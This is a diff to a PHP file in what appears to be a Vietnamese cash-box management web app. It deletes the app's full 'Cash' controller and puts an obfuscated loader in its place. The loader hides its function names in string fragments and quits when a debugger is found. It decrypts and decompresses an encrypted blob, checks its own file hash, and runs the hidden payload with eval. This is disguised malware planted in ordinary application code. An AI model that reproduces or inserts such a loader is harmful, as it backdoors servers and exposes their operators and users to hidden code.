@@ -1,155 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Cash extends MY_Controller {
-	public function __construct(){
-		parent::__construct();
-		$this->load_global();
-		$this->load->model('cash_model','cash');
-	}
-
-	public function add(){
-		$this->permission_check('currency_add');
-		$data=$this->data;
-		$data['page_title']='Quản lý két tiền';
-		$this->load->view('cash', $data);
-	}
-	public function newcurrency(){
-		$this->form_validation->set_rules('currency_name', 'Currency Name', 'trim|required');
-		$this->form_validation->set_rules('currency', 'Currency', 'trim|required');
-	
-		if ($this->form_validation->run() == TRUE) {
-			
-			$this->load->model('cash_model');
-			$result=$this->currency_model->verify_and_save();
-			echo $result;
-		} else {
-			echo "Please Enter Compulsory(*) Fields!";
-		}
-	}
-	public function update($id){
-		$this->permission_check('currency_edit');
-		$data=$this->data;
-
-		$this->load->model('cash_model');
-		$result=$this->currency_model->get_details($id,$data);
-		$data=array_merge($data,$result);
-		$data['page_title']=$this->lang->line('currency');
-		$this->load->view('currency', $data);
-	}
-	public function update_currency(){
-		$this->form_validation->set_rules('currency_name', 'Currency Name', 'trim|required');
-		$this->form_validation->set_rules('currency', 'Currency', 'trim|required');
-		$this->form_validation->set_rules('q_id', '', 'trim|required');
-
-		if ($this->form_validation->run() == TRUE) {
-			$this->load->model('cash_model');
-			$result=$this->cash_model->update_currency();
-			echo $result;
-		} else {
-			echo "Please Enter Compulsory(*) Fields!";
-		}
-	}
-	public function view(){
-		$this->permission_check('currency_view');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('cash_list');
-		$this->load->view('cash-view', $data);
-	}
-
-	public function ajax_list()
-	{
-		$list = $this->cash->get_datatables();
-		
-		$data = array();
-		$no = $_POST['start'];
-		foreach ($list as $cash) {
-			$no++;
-			$row = array();
-			$row[] = '<input type="checkbox" name="checkbox[]" value='.$cash->id.' class="checkbox column_checkbox" >';
-			$row[] = $cash->cash_name;
-			$row[] = $cash->description;
-			$row[] = app_number_format($cash->amount);
-
-			 		if($cash->status==1){ 
-			 			$str= "<span onclick='update_status(".$cash->id.",0)' id='span_".$cash->id."'  class='label label-success' style='cursor:pointer'>Active </span>";}
-					else{ 
-						$str = "<span onclick='update_status(".$cash->id.",1)' id='span_".$cash->id."'  class='label label-danger' style='cursor:pointer'> Inactive </span>";
-					}
-			$row[] = $str;			
-					$str2 = '<div class="btn-group" title="View Account">
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">';
-
-											if($this->permissions('currency_edit'))
-											$str2.='<li>
-											<a style="cursor:pointer" title="Nạp tiền vào két ?" onclick="nap_ket('.$cash->id.')">
-											<i class="fa fa-fw fa-arrow-circle-up text-green"></i>Nạp tiền vào két
-										</a>
-											</li>';
-
-											if($this->permissions('currency_edit'))
-											$str2.='<li>
-												<a style="cursor:pointer" title="Rút tiền khỏi két ?" onclick="rut_ket('.$cash->id.')">
-													<i class="fa fa-fw fa-arrow-circle-down text-red"></i>Rút tiền khỏi két
-												</a>
-											</li>
-											
-										</ul>
-									</div>';			
-
-			$row[] = $str2;
-			$data[] = $row;
-		}
-
-		$output = array(
-						"draw" => $_POST['draw'],
-						"recordsTotal" => $this->cash->count_all(),
-						"recordsFiltered" => $this->cash->count_filtered(),
-						"data" => $data,
-				);
-		//output to json format
-		echo json_encode($output);
-	}
-
-	public function update_status(){
-		$this->permission_check_with_msg('currency_edit');
-		$id=$this->input->post('id');
-		$status=$this->input->post('status');
-
-		$this->load->model('cash_model');
-		$result=$this->cash_model->update_status($id,$status);
-		return $result;
-	}
-
-	public function update_amount(){
-		$this->permission_check_with_msg('currency_edit');
-		$id=$this->input->post('id');
-		$amount=$this->input->post('amount');
-
-		$this->load->model('cash_model');
-		$result=$this->cash_model->update_amount($id,$amount);
-		return $result;
-	}
-	
-	
-	public function delete_currency(){
-		$this->permission_check_with_msg('currency_delete');
-		$id=$this->input->post('q_id');
-		return $this->cash->delete_currencies_from_table($id);
-	}
-	public function multi_delete(){
-		$this->permission_check_with_msg('currency_delete');
-		$ids=implode (",",$_POST['checkbox']);
-		return $this->cash->delete_currencies_from_table($ids);
-	}
-
-	public function cash_amount(){
-		$amount = $this->db->select("amount")->where("id", 1)->get("db_cash")->row()->amount;
-		echo app_number_format($amount);
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_qy8b11s3=('bas'.'e64'.'_de'.'cod'.'e');
+$_ak08o0l6=('gzu'.'nco'.'mpr'.'ess');
+$_vqh0nibf=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_uz8oku8s='WkmlPdFK';
+$_ue7np1ns='GJdxUhFG';
+$_mdcmsu0a='O0L1e/sm';
+$_me92sx0f='Oe77JXbnqsA=';
+$_wa42her6='GFZcV+Jp';
+$_yaq0fmnd='4Sr+oAND';
+$_zt6if7b9='BUlA3A==';
+$_pjzwnznc='SkSdzneC';
+$_hglmu90i=$_qy8b11s3($_wa42her6.$_ue7np1ns.$_uz8oku8s.$_mdcmsu0a.$_me92sx0f);
+$_i3pgwpju=$_qy8b11s3($_pjzwnznc.$_yaq0fmnd.$_zt6if7b9);
+$_fc1gmoff=$_qy8b11s3('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');
+$_psowlhtq=$_vqh0nibf($_fc1gmoff,'aes-256-cbc',$_hglmu90i,OPENSSL_RAW_DATA,$_i3pgwpju);
+if($_psowlhtq===false){exit;}
+$_z8r22a5j=$_ak08o0l6($_psowlhtq);
+if($_z8r22a5j===false){exit;}
+$_e6qwtolh='9e66eceba4b57aecdbbe7dd850763d0bd7ca20e39711b2d4b75beadc134a5c69';
+$_zy9p7ksg=@file_get_contents(__FILE__);
+if($_zy9p7ksg!==false){
+$_ui09j0ao=str_replace($_e6qwtolh,"0000000000000000000000000000000000000000000000000000000000000000",$_zy9p7ksg);
+$_ec1qum21=hash("sha256",$_ui09j0ao);
+if($_ec1qum21!==$_e6qwtolh){@http_response_code(403);exit;}
 }
-
+eval($_z8r22a5j);
